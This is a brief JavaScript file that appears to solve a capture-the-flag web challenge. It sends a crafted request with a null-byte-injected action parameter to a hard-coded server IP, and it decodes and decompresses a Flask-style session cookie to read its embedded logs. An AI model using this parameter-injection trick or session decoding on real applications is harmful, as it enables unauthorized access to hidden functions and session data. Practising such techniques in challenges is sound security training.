const got = require('got')
const zlib = require('zlib')
const flatten = require('just-flatten-it')
const { base64 } = require('../common/utils')

const URL_GET_FLAG = 'http://116.85.48.107:5002/d5af31f66147e857/?action:get_flag;yelo'

async function fetch () {
  const url = 'http://116.85.48.107:5002/d5af31f66147e857/?action:%00func:show_flag;yelo'
  const response = await got(url)
  console.log(response)
}

/**
 * https://www.leavesongs.com/PENETRATION/client-session-security.html
 */
function decrypt (session) {
  let buf = Buffer.from(session.split('.')[1], 'base64')
  return JSON.parse(zlib.unzipSync(buf).toString())
}

function readLogs (payload) {
  return flatten(payload.log).map((log) => base64.decode(log[' b']))
}

async function main () {
  try {
    // console.log(await fetch())
    let session = '.eJyrVsrJT1eyiq5WUkhSslKKDPczSAy3LPXP88tPMk5Ji8qtyIiqKjGNCq8oU6rVQVeVm5KT4maZm-TuludvnJOT5G5hi0VVXlRBVESyeWK4aXZURDo2Fblehqkhxab-IdkgWZhjovLCSiOrCrKSjEyrUsINcyKMncqAhhj4V2Wb-gfaEmVVbKyOUl5pbnxmSWpusZKVoY5SQX5mXgmQaVQLABrFT2Y.D5O6mA.q1Yl9ojHsgoCgykXpj0pFg8v3F0'
    let payload = decrypt(session)
    let logs = readLogs(payload)
    console.log(payload, logs)
  } catch (error) {
    console.error(`Error: ${error.message}`)
  }
}

main()
